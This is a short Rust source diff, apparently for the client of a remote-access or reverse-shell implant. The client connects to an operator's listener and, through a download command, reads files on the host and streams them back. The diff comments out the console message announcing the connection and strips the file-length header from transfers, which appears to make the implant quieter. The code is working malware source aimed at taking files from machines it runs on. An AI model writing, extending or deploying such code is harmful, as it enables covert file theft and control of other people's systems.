@@ -17,10 +17,10 @@ enum HandlerStatus {
 
 pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
     let mut clt = TcpStream::connect(i.to_owned() + ":" + p)?;
-    println!(
-        "[+] TCP connection success to the listener at {}",
-        clt.peer_addr()?
-    );
+    //println!(
+    //    "[+] TCP connection success to the listener at {}",
+    //    clt.peer_addr()?
+    //);
     //let mut connector_builder = TlsConnector::builder();
     //connector_builder.danger_accept_invalid_certs(true);
     //connector_builder.danger_accept_invalid_hostnames(true);
@@ -103,17 +103,6 @@ fn dl_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
     let path: Vec<&str> = cmd.split(' ').collect();
     match File::open(path[1]) {
         Ok(mut file) => {
-            let meta = file.metadata();
-            if meta.is_err() {
-                println!("File metadata error : {}", meta.err().unwrap());
-                return HandlerStatus::MetadataError;
-            }
-            let meta = meta.unwrap();
-            let eof = format!("EOF:{}", meta.len());
-            let status = tls_stream.write_all(eof.as_bytes());
-            if status.is_err() {
-                return HandlerStatus::SendError;
-            }
             let mut file_buffer = [0; 4096];
             loop {
                 let bytes_read = file.read(&mut file_buffer).expect("failed to read");
